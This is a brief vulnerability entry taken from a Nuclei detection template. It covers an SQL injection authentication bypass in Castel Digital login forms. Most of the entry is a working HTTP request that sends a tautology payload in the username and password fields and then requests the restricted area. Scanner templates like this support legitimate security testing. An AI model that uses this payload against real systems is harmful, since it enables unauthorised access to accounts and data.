# Vulnerability: Castel Digital - Authentication Bypass
**Classification:** CWE-89
**Source:** Nuclei Template (`castel-digital-sqli.yaml`)

## Description
SQL Injection vulnerability in Castel Digital login forms.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /restrito/login/sub/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=x%27%3D%27x%27or%27x&password=x%27%3D%27x%27or%27x

GET /restrito/ HTTP/1.1
Host: {{Hostname}}
```

